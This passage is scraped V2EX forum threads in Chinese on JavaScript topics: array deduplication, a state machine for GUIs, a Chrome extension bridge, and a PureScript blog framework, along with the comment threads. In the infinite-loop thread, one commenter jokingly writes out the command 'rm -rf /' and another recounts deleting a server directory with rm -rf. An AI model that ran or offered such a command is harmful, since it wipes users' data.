src=\"https://segmentfault.com/img/bVthpR\" alt=\"图片描述\"></p>\n\n<p>结果是正常的。</p>\n\n<p>所以，我们在向 Array 对象添加去重方法时，不能使用[]的方式，要使用 JSON 或者空对象的方式，但是依然无法区分数值和数值型字符串。</p>\n\n<h2>JSON 去重 3</h2>\n\n<p>在 JSON 去重 2 我们判断的是 cache[array[i]]值是否为真。 cache[array[i]]这种实际是当做 cache 的自定义属性存储的， array[i]被转成了字符串形式，也同样存在无非区分数值和数值型字符串的情况，所以我们需要对 JSON 方式 2 进行改造。</p>\n\n<p>代码如下:</p>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\nfunction unqiue(array){\n    var cache={};\n    var result=[];\n    for(var i=0;i&lt;array.length;i++){\n        var record=typeof(array[i])+array[i];\n        //如果 json 或者是或 hash 里没有\n        if(!cache[record]){\n            result.push(array[i]);\n            //设置当前结果为已存在\n            cache[record]=true;\n        }\n    }\n    return result;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<p>相比于 JSON 去重 2 ，我们对判断条件做了修改， cache[array[i]]存在数值和数值字符串时[array[i]]相同的情况，但是[typeof(array[i])+array[i]]却不存在这种情况，数值的 typeof 为 number ，数值字符串的 typeof 为 string ，区分开了这两种情况。</p>\n\n<p>所以最终我们为 Array 对象添加的是这样的去重方法</p>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\nArray.prototype.unqiue=function(){\n    var cache={};\n    var result=[];\n    for(var i=0;i&lt;this.length;i++){\n        var record=typeof(this[i])+this[i];\n        //如果 json 或者是或 hash 里没有\n        if(!cache[record]){\n            result.push(this[i]);\n            //设置当前结果为已存在\n            cache[record]=true;\n        }\n    }\n    return result;\n}\n\n\nconsole.log(arr.unqiue());\n</pre></div>\n\n<h2>补充队列去重方式</h2>\n\n<p>从网友哪里知道另外的两种队列方式，代码如下，原理和我写的队尾递归去重类似，代码如下：</p>\n\n<h3>队尾去重</h3>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\nfunction unqiue(array){\n    var result=[];\n    array.sort(function(m,n){return m-n});\n    for(var i=0;i&lt;array.length;i++){\n        if(array[i]!==result[result.length-1]){\n            result.push(array[i]);\n        }\n    }\n\n    return result;\n}\n\n console.log(unqiue(arr));\n</pre></div>\n\n<h3>队首去重</h3>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\n function unqiue(array){\n    var result=[];\n    array.sort(function(m,n){return n-m});\n    for(var i=0;i&lt;array.length;i++){\n        if(array[i]!==result[0]){\n            result.unshift(array[i]);\n        }\n    }\n\n    return result;\n\n }\n console.log(unqiue(arr));\n</pre></div>\n\n<h2>附言：</h2>\n\n<p>关于 JavaScript 数组去重的方式基本就总结到这里了，欢迎在评论里指出错误和贡献其他方法。</p>\n</div></div>"], "reply": "34", "tittle": "JavaScript 算法初探——数组去重", "comment": ["咱们直接用 Map 类就好了嘛……", "谈到算法效率的时候，请给出时空复杂度。", "我想说的是: 楼主居然分不清 `JSON` 和 `Object`, 以及居然不知道 `{}` 是 `new Object` 的缩写.\r", "居然单独把 var cache = {} 做为 `JSON` 拿来讲.", "如果不保证效率，那么算法有什么意义呢？", "咱们直接用 Set 类就好了嘛……", "我也想吐槽 JSON 这个说法", "特意来登陆吐槽 JSON 的。。\r", "用同样的时间做去重，用 map ，只是消耗现代机器无视的内存占用来去重。可以最少比你多写 3 个函数了。。。", "JSON 是哪四个单词的全称楼主", "JSON 是文件格式 /文本格式吧\r", "\r", "`!cache[array[i]]` 不能用来判断 `value == false` 的情况", "[ 1, 1, 'a', 'a' ].filter( (el, i, arr) => arr.indexOf(el) === i);\r", "\r", "Array.from( new Set([ 1, 1, 'a', 'a' ]) );\r", "\r", "一般这样就好了吧，搞的长篇大论啊？？", "统一回复下 JSON 的问题，这个确实是我失误没有说清楚，本来只是用比较通俗的说法来解释下{}去重的方式，本来想用字典吧，但是字典属于 python 的说法。所以就用了 json 来指代下，因为 json 的 key 也具有唯一性嘛，给各位道歉，至于{}和 new object 缩写我是知道的，以后不敢随便在 V2EX 上发文章了，太可怕了。", "至于为什么不用 object 来指代，因为 json 格式比较易于理解，也容易让各位注意到实际上数组元素的类型已经被转换为了字符串，考虑不周，还望见谅。", " !cache[array[i]] 可以判断 value==false 的情况，这里的 false 只是做了新对象的 key ，实际是!cache[“ false ”]\r", "\r", " @", " @", " @", "  JSON 是 JavaScript Object  Notation 的缩写，抱歉啊，才疏学浅，表达不严谨，出了问题，请各位见谅。另外请教各位， V2EX 的帖子怎么删除啊，不敢再误导其他人。吾长见笑于大方之家", "不先 sort 然后依次比对么？", "[...new Set([1, 1, 2, 2, 3, \"a\", \"a\"])]\r", "\r", "搞定。。", "for-in 很慢，数量级级别的慢（除了 IE ），不要用 for-in", "算法在哪？", "ES6: \r", "    Array.from(new Set(array).values())", " 这里都是大神，没把握最好不要发文章 （逃", "为什么 indexOf 的效率高，求证明，不是找茬\r", "因为我只能想到这一种办法去重了\r", "一直觉得效率很低下", " 是相对高，不是最高，最高是字典去重，用空间换时间， ES6 原生的方式我没测过", "map 背后的实现应该是 hashmap 吧?", " 说的好像 indexOf 不是循环一样。。", " 说的方法就很好了啊", " 别跟网友计较，网友是什么，你说 xx 地方地政了，他们有一堆在下面讨论错别字的。\r", "\r", "另外别发表文章到这里，发个链接就行了。这里不适合。没有销户，删除的地方，不要发文章。", "目前只有 Set 是 O(n)吧...", "const nums = [ 1, 2, 1, 3, 1, 2, 4 ];\r", "\r", "const withoutDups = Array.from(new Set(nums));", " 鱼爆一地", "调用数组自己的 sort 方法后再做队列排序， sort 本身已经增加了复杂度了，整体效率并不会高", " 这话你说的就不对了, 他不发出来, 他怎么知道自己的不足?\r", "你为什么看到的只是别人在挑他的毛病?\r", "别人能找出来原因, 这只能说明他做的还不够, 自己还有不足的地方,\r", "还需要学习. 这是在帮助他进步 好不好?\r", "感谢各位，我确实有很多不足，谢谢各位，我会努力的，年轻人还是要提高自己的姿势水平！", "23333  年轻人还是要多提高自己的姿势水平再来写文章啊", "文章其实还好，但是觉得没有深入到根基，其实去重算法我觉得基本上就是基于 hash 的，还有神奇的 bloom-filter,当然也有简单暴力算法。\r", "还有就是改变数据类型这个我觉得不是事吧，你在暴露的接口那里，再转换回去就好了嘛。你算法内部的数据结构怎么会是一个问题呢？关键是你要给出对应的时空复杂度，那才有讨论算法的价值。", "就问一句 indexOf 的时间复杂度是多少？\r", "还有 lz 列的 n 种写法其实是等效的。。"]},
{"content": ["<div class=\"topic_content\">还是 DOM ？</div>"], "reply": "目前尚无回", "tittle": "python 的核心是 pythonic， ruby 的核心是 metaprogramming， JavaScript 的核心的原型方法吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一家位于 San Antonio 的美国公司正在寻找有才华的 javascript 程序员远程工作。申请人必须用 Javascript 和 JQuery ，包括写 jQuery 插件非常有经验。如果你知道 Angular.js 、 Polymer.js 或 React.js ，这将是加号。我们也使用的 Laravel 、 CCS3 和 HTML 5 的后端因此他们的基本知识将是一项资产。</p>\n\n<p>所有工作将都在远程的 git 这么有经验，将需要源代码管理。我们提供稳定、 持续的工作，工资取决于经验和生产力。我们的 CTO 住在成都，一年部分，所以成都居民将被优先。英语语言技能将是一大亮点。</p>\n\n<p>目前，我们需要一个全职的人和一个兼职的人或实习生。</p>\n\n<p>如果有兴趣联系布拉德 · QQ: 2408882611 把\"Javascript  Programmer\"放在好友请求</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Javascript, Jquery, Angular.js, React.js, Polymer.js Programmers", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>写 GUI 的时候为了维护界面的状态一直用 OOP ，但是开发的很慢，也容易出 Bug ，然后就用状态机来实现，感觉还不错，有这么用的小伙伴吗？</p>\n<div class=\"highlight\"><pre>const FSM = function () {\n    this.states = [];\n    this.current = undefined;\n    this.enabled = true;\n};\nFSM.prototype.add = function (name, enter, leave, ...event_foo_pairs) {\n    let state = {\n        __name__: name,\n        enter: enter,\n        leave: leave\n    };\n    event_foo_pairs.forEach(pairs =&gt; state[pairs[0]] = pairs[1]);\n    this.states.push(state);\n    this.states.length === 1 &amp;&amp; this.go(name);\n};\nFSM.prototype.go = function (name, ...var_args) {\n    const prev = this.states.filter(i =&gt; i.__name__ === this.current)\n    const can_leave = prev.map(i =&gt; i.leave()).reduce((p, n) =&gt; p &amp;&amp; n, true);\n    if (can_leave) {\n        const next = this.states.filter(i =&gt; i.__name__ === name);\n        next.length === 0 &amp;&amp; console.error('No such next jump: ', name);\n        this.current = name;\n        const ret = next.map(i =&gt; i.enter.apply(this, var_args)).reduce((p, n) =&gt; p &amp;&amp; n, true);\n        return ret;\n    } else {\n        console.warn('Can\\'t leave state: ', this.current);\n        console.warn(new Error().stack);\n        return false;\n    }\n};\nFSM.prototype.fire = function (event, ...var_args) {\n    return this.states.filter(i =&gt; i.__name__ === this.current &amp;&amp; i.hasOwnProperty(event)).map(s =&gt; s[event]).map(i =&gt; i.apply(this, var_args));\n};\n</pre></div>\n</div></div>"], "reply": "22", "tittle": "GUI 编程有用有限状态机代替 OOP 的吗？", "comment": ["把这个问题说的学渣能明白一点,其实就是一个 State 控件(可以支持视图,也可以虚拟的),根据提供的状态进行跳转.\r", "是这个意思吗?", "Windows 的消息循环里面一般不就是一个有限状态机么", "OOP 只是编程范式吧 - - 状态机是数学模型吧？ 用 OOP 也能实现状态机啊 - - ||||", "状态机不是基本吗 XD\r", "好吧其实是一个门槛,恭喜你迈过去", "最基本的状态机不就是正则表达式么。。另外维护状态什么，好像新的 redux 就是搞这个的", "react ？", "给楼主的思想点个赞。推荐 React 和 Redux 。", "这个思路不错！不过其实维护对象的状态是不是就是在状态机里转哪.....", "当年的 flex 不就是支持 state 么。 但有时候有多种状态， 一大堆 fsm 也不方便", " 是能实现   只是构建模型的时候思考方式不一样啊", " 求高级玩法", " 状态机可以包含子状态，转移的时候连带自状态一并转移\r", "我试过中这种方法，代码就不贴了\r", "也挺清楚的", " 也要比 if else 清楚啊", "  的确。但是构建问题模型的时候，我指的是这两者的思路", "  母鸡  很久不研究 windows 的消息系统了", "  是", "想当年在单片机上就有 qpc 状态机+emwin GUI 。用状态机表示目录层级没问题，框架一大复杂度急剧增加，维护状态机本身的开销比较大。另外呢 FSM 本身不足以作为一种 paradigm 和 OOP 比较", " \r", "我没办法教,我是写五年累积经验.\r", "持续学习和累积经验是唯一解.", "JS 不是 GUI 的好工具。模拟 OOP 本身就挺费力的。\r", "\r", "看看 OC 或者 C# 你才可以感受到为什么 OOP 在 GUI 领域是特别好的工具。", "状态机？ 可以看这个。。。 ", " 在最后有关于状态机 UI 编程。。\r", "代码大概这样\r", "\r", "let rec drawingLoop(clr, from) = async {\r", "    let! move = Async.AwaitEvent(form.MouseMove) #1\r", "    if (move.Button &&& MouseButtons.Left) = MouseButtons.Left then\r", "    drawRectangle(clr, from, (move.X, move.Y)) #2\r", "        return! drawingLoop(clr, from) #2\r", "    else\r", "        return (move.X, move.Y) \r", "} #3\r", "        \r", "let waitingLoop() = async {\r", "    while true do #4\r", "    let! down = Async.AwaitEvent(form.MouseDown)\r", "    let downPos = (down.X, down.Y)\r", "    if (down.Button &&& MouseButtons.Left) = MouseButtons.Left then\r", "        let! upPos = drawingLoop(Color.IndianRed, downPos) #5\r", "    do printfn \"Drawn rectanlge (%A, %A)\" downPos upPos \r", "}\r", "    \r", "#A Wait for the next mouse action\r", "#2 Refresh rectangle and continue in the 'Drawing' state\r", "#3 Return end location to the 'Waiting' state\r", "#4 Repeat after drawing finishes\r", "#5 Transition to the 'Drawing' state", "  OC, swift, C# 数据绑定是好用啊，但也没有那么好用啊", " 666666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目的是搞一个网页上的视频录制与下载，从 github 上找到一个库<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/collab-project/videojs-record\">https://github.com/collab-project/videojs-record</a><br>\n这个库里有一段代码，把 video.webm 这个 blob 和 audio.wav 这个 blob 装进一个 object 里，这个 object 叫做 player.recordedData ，我的目的是把它下载下来。<br>\n但目前只能将 video 和 audio 分开下，这样的话视频就没有声音。<br>\n大家指点一下 怎么才能下载一个图像声音都有的 wemb ？</p>\n</div></div>"], "reply": "1", "tittle": "求助： JS 下载一个包含 video blob 和 audio blob 的 Object", "comment": ["1. 你可以用 ffmpeg 合并成一个 mp4\r", "2. 你可以用 js 同时播放视频和伴音"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>首先我在这里，删除了代码里的 <code>i++</code>;</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.w3school.com.cn/tiy/t.asp?f=js_loop_for_cars\">http://www.w3school.com.cn/tiy/t.asp?f=js_loop_for_cars</a></p>\n\n<p>然后我调试自己的代码，直接 <code>for (;i &lt; _el.length;) { //其他代码 }</code> ，也没有写 <code>i++;</code>, 然后就切换回编辑器继续写。</p>\n\n<p>过了一会我发现 iStat MEM 条快满了，我没在意，我想可能是程序开太多了吧。</p>\n\n<p>等我把 JS 代码写的差不多继续 Chrome 调试的时候。</p>\n\n<p>咦！鼠标怎么不动了！<br>\n咦！！鼠标怎么变菊花了！！</p>\n</div></div>"], "reply": "36", "tittle": "刚刚写 JS 循环傻逼了，把 Chrome 玩死，内存吃满，只能关机重启", "comment": ["没听到 mac 起飞的声音？", "如果经常写出死循环，就断点调试咯，免得浏览器死掉", " 说得对~", " 没有听见 QwQ\r", " 今天脑抽了", "我偶尔也写个死循环，赶紧把 chrome 进程干掉就好了。没大碍", "原来 fir 也是这么玩死我机子的\r", "上传个包,发现电脑死了.\r", "联系客服,客服表示是 bug,不修\r", "\r", "从此 fir 一生黑", "Chrome 运行 15 秒（也有可能是 30 秒，不记得了）左右会自动提示代码执行时间过长，是否终止的", " 没有任何提示...", "我以前也干过，貌似你把 chrome 进程杀掉就可以了。\r", "js 好像是单线程操作的，这种循环基本上整张网页就啥都不干了。", "写写死循环没什么 执行了\r", "\r", "rm -rf /\r", "\r", "这个伟大的命令就开心了", " Firefox 有… chrome 有没有呢？不记得了嘿嘿", "V8 不是有内存上限来着么", " 鼠标键盘全挂了", "之前 Chrome 控制台不小心写了个死循环没注意就放后台没管，放了一小时除了 CPU 风扇声音比较大没有任何问题…不过最后也只能直接杀将进程，整个控制台都未响应了…", "考虑到我是 Windows 可能内存管理机制不太一样所以没问题吧", "while(true){};\r", "也没死啊， 不知道你什么情况", "command + q", " 应该是 @", " 死循环中的 //其他代码 搞的鬼。只要有点动态创建的东西，就会慢慢把内存占满的。不然一个死循环顶多把 CPU 占满的，不至于整个系统都挂掉的。", "基本常识，三个空的 for 循环是自杀的最快道路。", "我也写过一个死循环，是一个 timeout 函数。", "#论 32 位浏览器的优势", "我也手贱了，不过只有当前窗口死掉了！", "chrome 的内存占用简直让人无语， 8g 内存经常被吃到只剩 2g ，连个 dota2 和 Chrome 同开都会卡", "冬天天冷时候经常这么干。", "不能强退吗", " 占满内存和 cpu 没法强退", " 时间过长提示是否结束的是火狐。。。。 chrome 没有", "windows 下可以停止当前进程，不至于全死了。。但是不知道 mac 什么情况。。", " 新一点系统，这命令已经没什么危险性了，要加一个挺长的参数跳过安全模式才让执行", " 我也经常同开，但是不会卡", "firefox 有长时间无响应提醒，但并不代表就不会过热关机。。", " 哈哈，那天手贱的把公司服务器 var/lib 目录给 rm -rf 了。。。运维说你咋不直接在根目录下执行", "玩脱了", "楼主是单核机器？", " 这样 f 参数岂不是表示没用了\r", " rm 之前看一看啊 之前删过自己机器上的用户目录，从此 rm 被 alias 成了 mv", " f 针对这条命令，确实没用了", " \r", "f : 没想到你是这样的 rm ，你让我 f 的脸往哪放"]},
{"content": ["<div class=\"topic_content\">&lt;script&gt;\r<br>window.Connect = function(time){\r<br>        var bereceive = [],\r<br>            besend = [], a, b;\r<br>        var body = document.body;\r<br>        if(!body){\r<br>            throw new Error(\"window.Connect 函数内没有找个 document.body 元素对象\");\r<br>            return;\r<br>        };\r<br>        if(chrome[\"extension\"]){\r<br>            a = \"plugs\",b= \"web\";\r<br>        }else{\r<br>            a = \"web\",b= \"plugs\";\r<br>        };\r<br>        var loop = window.setInterval(function(){\r<br>            var p =  body.dataset[a];//设置\r<br>            var w =  body.dataset[b]; //读取\r<br>\r<br>            //接收来自网页端变量\r<br>            try{\r<br>                var j = JSON.parse(w);\r<br>                bereceive.push(j);\r<br>            }catch(e){}\r<br>            body.dataset[b]=\"\";\r<br>\r<br>            //判断网页端是否读取了插件端的发送，再判断是否有数据要发送\r<br>            try{\r<br>                if(!p &amp;&amp; besend.length){\r<br>                    var t = besend.shift();\r<br>                    var s = JSON.stringify(t);\r<br>                    body.dataset[a]=s;\r<br>                }\r<br>            }catch(e){}\r<br>        },time||500);\r<br>\r<br>        return {\r<br>            \"Get\": function(){\r<br>                if(!bereceive.length){return null};\r<br>                return bereceive.shift();\r<br>            },\r<br>            \"Set\":function(arg){\r<br>                besend.push(arg);\r<br>            },\r<br>            \"Close\":function(){\r<br>                window.clearInterval(loop);\r<br>            }\r<br>        }\r<br>    }(/*这里可设置刷新时间,默认 500 毫秒*/);\r<br> &lt;/script&gt;\r<br>\r<br>//使用方法：上面代码，需要在插件端和网页端放入，这样才能通信。使用这个方法之前，我想不出还有什么方法可以直接变量共享，如果大家有更好的方法，留言回复一下。谢谢。\r<br>\r<br>\r<br>插件或网页端设置\r<br>window.Connect.Set({a:1,b:2})\r<br>\r<br>插件或网页端读取\r<br>var a = window.Connect.Get()\r<br>console.log(a)\r<br>//{a:1,b:2}\r<br>\r<br>插件或网页端关闭，这个可以不用理会。\r<br>window.Connect.Close()</div>"], "reply": "目前尚无回", "tittle": "chrome 插件和页面变量共享传输", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>手撸了一个简单 web 框架，拿来做博客</h1>\n\n<p>这两个半个月自己简单手撸了个 web 框架。用得是 PureScript 撸的， PureScript 跟 CoffeeScript 一样是一门 target 到 JavaScript 的语言，虽然 PureScript 从语言本身的设计角度来说比 CoffeeScript 不知道高到哪里去了……但那也架不住 CoffeeScript 简单方便易学大众有生态。</p>\n\n<p>其实拿 PureScript 手撸这个 web 框架是用来炫技的， PureScript 的强类型纯函数式的特性我觉得真的不太适合应用场景，把本身很简单的事情变复杂了。用 JavaScript / Ruby / Python / PHP 我实现这些东西顶多就两三天。</p>\n\n<p>》》<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/loveaira.me\">Github 传送门</a><br>\n》》<a target=\"_blank\" rel=\"nofollow\" href=\"http://lovearia.me/\">LoveAria.Me 博客主站</a></p>\n\n<p>下面讲讲我主要做的事情：</p>\n\n<h3>1.SQLite3 的 PureScript Binding ，以及一个简单的 ORM （还是半残状态，连 JOIN 我都没实现好，强类型面对这种场景只能日狗）。</h3>\n\n<p>虽然是自己手撸的……但是放心，注入不了的，本宝宝做了防注入的。</p>\n\n<p>可以用下面哪种好看的方式做查询了，例如：</p>\n<div class=\"highlight\"><pre><span class=\"nf\">insert</span> <span class=\"s\">\"article\"</span> <span class=\"p\">[</span> <span class=\"s\">\"title\"</span> <span class=\"o\">.=</span> <span class=\"n\">title</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"category_id\"</span> <span class=\"o\">.=</span> <span class=\"n\">category_id</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"raw_content\"</span> <span class=\"o\">.=</span> <span class=\"n\">content</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"content\"</span> <span class=\"o\">.=</span> <span class=\"kt\">Markdown</span> <span class=\"n\">content</span> <span class=\"p\">]</span>\n\n<span class=\"nf\">update</span> <span class=\"s\">\"article\"</span> <span class=\"p\">[</span> <span class=\"s\">\"title\"</span> <span class=\"o\">.=</span> <span class=\"n\">title</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"category_id\"</span> <span class=\"o\">.=</span> <span class=\"n\">category_id</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"raw_content\"</span> <span class=\"o\">.=</span> <span class=\"n\">content</span>\n                <span class=\"p\">,</span> <span class=\"s\">\"content\"</span> <span class=\"o\">.=</span> <span class=\"kt\">Markdown</span> <span class=\"n\">content</span><span class=\"p\">]</span> <span class=\"p\">(</span><span class=\"s\">\"id\"</span> <span class=\"o\">.==</span> <span class=\"n\">id</span><span class=\"p\">)</span>\n\n<span class=\"nf\">first</span> <span class=\"s\">\"article\"</span> <span class=\"p\">(</span><span class=\"s\">\"id\"</span> <span class=\"o\">.==</span> <span class=\"n\">id</span> <span class=\"o\">.&amp;&amp;</span> <span class=\"s\">\"user_id\"</span> <span class=\"o\">.==</span> <span class=\"n\">user_id</span><span class=\"p\">)</span> <span class=\"p\">(</span><span class=\"kt\">Asc</span> <span class=\"s\">\"id\"</span><span class=\"p\">)</span>\n\n<span class=\"nf\">findall</span> <span class=\"s\">\"article\"</span> <span class=\"p\">(</span><span class=\"s\">\"category_id\"</span> <span class=\"o\">.&lt;-</span> <span class=\"p\">[</span><span class=\"n\">cid1</span><span class=\"p\">,</span> <span class=\"n\">cid2</span><span class=\"p\">,</span> <span class=\"n\">cid3</span><span class=\"p\">])</span> <span class=\"p\">(</span><span class=\"kt\">Desc</span> <span class=\"s\">\"id\"</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>2.一门 HTML 模板 DSL 。因为是 PureScript 的 DSL ，所以其实还是 PureScript 本身。只是语法看上去像一门单独的语言而已, 并且还是有些丑的。</h3>\n<div class=\"highlight\"><pre><span class=\"nf\">list</span> <span class=\"ow\">::</span> <span class=\"kt\">Array</span> <span class=\"kt\">Category</span><span class=\"o\">.</span><span class=\"kt\">RichArticle</span> <span class=\"ow\">-&gt;</span> <span class=\"kt\">Template</span>\n<span class=\"nf\">list</span> <span class=\"n\">articles</span> <span class=\"ow\">=</span> <span class=\"kr\">do</span>\n  <span class=\"n\">base</span>\n  <span class=\"n\">title</span> <span class=\"s\">\"Article\"</span>\n  <span class=\"n\">extend</span> <span class=\"s\">\"body\"</span> <span class=\"o\">$</span> <span class=\"kr\">do</span>\n\n    <span class=\"n\">ifLogined</span> <span class=\"o\">$</span> <span class=\"nf\">\\</span><span class=\"kr\">_</span> <span class=\"ow\">-&gt;</span>\n      <span class=\"n\">t_a</span> <span class=\"p\">[</span><span class=\"n\">a_href</span> <span class=\"kt\">:=</span> <span class=\"s\">\"/article/create\"</span><span class=\"p\">]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Create\"</span>\n\n    <span class=\"n\">article_list</span> <span class=\"n\">articles</span>\n\n<span class=\"nf\">article_list</span> <span class=\"ow\">::</span> <span class=\"kt\">Array</span> <span class=\"kt\">Category</span><span class=\"o\">.</span><span class=\"kt\">RichArticle</span> <span class=\"ow\">-&gt;</span> <span class=\"kt\">Template</span>\n<span class=\"nf\">article_list</span> <span class=\"n\">articles</span> <span class=\"ow\">=</span> <span class=\"kr\">do</span>\n  <span class=\"n\">t_table</span> <span class=\"kt\">[]</span> <span class=\"kr\">do</span>\n    <span class=\"n\">t_tr</span> <span class=\"kt\">[]</span> <span class=\"kr\">do</span>\n      <span class=\"n\">t_th</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Id\"</span>\n      <span class=\"n\">t_th</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Title\"</span>\n      <span class=\"n\">t_th</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Category\"</span>\n      <span class=\"n\">t_th</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Create At\"</span>\n      <span class=\"n\">t_th</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"s\">\"Update At\"</span>\n\n      <span class=\"n\">forT</span> <span class=\"n\">articles</span> <span class=\"o\">$</span> <span class=\"nf\">\\</span><span class=\"n\">article</span> <span class=\"ow\">-&gt;</span> <span class=\"kr\">do</span>\n        <span class=\"n\">t_tr</span> <span class=\"kt\">[]</span> <span class=\"kr\">do</span>\n          <span class=\"n\">t_td</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"o\">$</span> <span class=\"n\">show</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">id</span>\n          <span class=\"n\">t_td</span> <span class=\"kt\">[]</span> <span class=\"kr\">do</span>\n            <span class=\"n\">t_a</span> <span class=\"p\">[</span><span class=\"n\">a_href</span> <span class=\"kt\">:=</span> <span class=\"s\">\"/article/show/\"</span> <span class=\"o\">++</span> <span class=\"n\">show</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">id</span><span class=\"p\">]</span>\n              <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">title</span>\n          <span class=\"n\">t_td</span> <span class=\"kt\">[]</span>  <span class=\"kr\">do</span>\n            <span class=\"n\">t_a</span> <span class=\"p\">[</span><span class=\"n\">a_href</span> <span class=\"kt\">:=</span> <span class=\"s\">\"/article/category/\"</span> <span class=\"o\">++</span> <span class=\"n\">show</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">category</span><span class=\"o\">.</span><span class=\"n\">id</span><span class=\"p\">]</span>\n              <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">category</span><span class=\"o\">.</span><span class=\"n\">name</span>\n          <span class=\"n\">t_td</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">create_at</span>\n          <span class=\"n\">t_td</span> <span class=\"kt\">[]</span> <span class=\"o\">$</span> <span class=\"n\">text</span> <span class=\"n\">article</span><span class=\"o\">.</span><span class=\"n\">update_at</span>\n</pre></div>\n\n<h3>3.基础的框架是在 PureScript-Express 上面建立的。所以基本的 handler 处理还是沿用 Express 。</h3>\n<div class=\"highlight\"><pre><span class=\"nf\">main</span> <span class=\"ow\">::</span> <span class=\"n\">forall</span> <span class=\"n\">e</span><span class=\"o\">.</span> <span class=\"kt\">ModelApp</span> <span class=\"p\">(</span><span class=\"n\">console</span> <span class=\"ow\">::</span> <span class=\"kt\">CONSOLE</span> <span class=\"o\">|</span> <span class=\"n\">e</span><span class=\"p\">)</span>\n<span class=\"nf\">main</span> <span class=\"ow\">=</span> <span class=\"kr\">do</span>\n  <span class=\"n\">liftEff</span> <span class=\"o\">$</span> <span class=\"n\">log</span> <span class=\"s\">\"Setting up\"</span>\n  <span class=\"n\">setProp</span> <span class=\"s\">\"json spaces\"</span> <span class=\"mf\">4.0</span>\n\n  <span class=\"n\">useExternal</span> <span class=\"o\">$</span> <span class=\"kt\">MW</span><span class=\"o\">.</span><span class=\"n\">bodyParser</span> <span class=\"p\">{</span><span class=\"n\">extended</span><span class=\"kt\">:</span> <span class=\"n\">false</span><span class=\"p\">}</span>\n  <span class=\"n\">static_path</span> <span class=\"ow\">&lt;-</span> <span class=\"n\">liftEff</span> <span class=\"o\">$</span> <span class=\"kt\">Config</span><span class=\"o\">.</span><span class=\"n\">static_path</span>\n  <span class=\"n\">useExternalAt</span> <span class=\"s\">\"/static\"</span> <span class=\"o\">$</span> <span class=\"kt\">MW</span><span class=\"o\">.</span><span class=\"n\">static</span> <span class=\"n\">static_path</span>\n\n  <span class=\"n\">useExternal</span> <span class=\"o\">$</span> <span class=\"n\">cookieSession</span> <span class=\"p\">{</span><span class=\"n\">secret</span><span class=\"kt\">:</span> <span class=\"kt\">Config</span><span class=\"o\">.</span><span class=\"n\">security_key</span><span class=\"p\">}</span>\n  <span class=\"n\">useExternal</span> <span class=\"o\">$</span> <span class=\"kt\">MW</span><span class=\"o\">.</span><span class=\"n\">setCookiesMaxAge</span> <span class=\"p\">(</span><span class=\"mi\">3600</span> <span class=\"o\">*</span> <span class=\"mi\">24</span> <span class=\"o\">*</span> <span class=\"mi\">30</span><span class=\"p\">)</span>\n\n  <span class=\"n\">use</span> <span class=\"kt\">CacheHandler</span><span class=\"o\">.</span><span class=\"n\">logger</span>\n  <span class=\"n\">use</span> <span class=\"kt\">CacheHandler</span><span class=\"o\">.</span><span class=\"n\">cacheMiddleware</span>\n\n  <span class=\"n\">mount</span> <span class=\"s\">\"/\"</span> <span class=\"kt\">HomeHandler</span><span class=\"o\">.</span><span class=\"n\">main</span>\n\n  <span class=\"n\">mount</span> <span class=\"s\">\"/user\"</span> <span class=\"kt\">UserHandler</span><span class=\"o\">.</span><span class=\"n\">main</span>\n  <span class=\"n\">mount</span> <span class=\"s\">\"/article\"</span> <span class=\"kt\">ArticleHandler</span><span class=\"o\">.</span><span class=\"n\">main</span>\n  <span class=\"n\">mount</span> <span class=\"s\">\"/category\"</span> <span class=\"kt\">CategoryHandler</span><span class=\"o\">.</span><span class=\"n\">main</span>\n  <span class=\"n\">mount</span> <span class=\"s\">\"/cache\"</span> <span class=\"kt\">CacheHandler</span><span class=\"o\">.</span><span 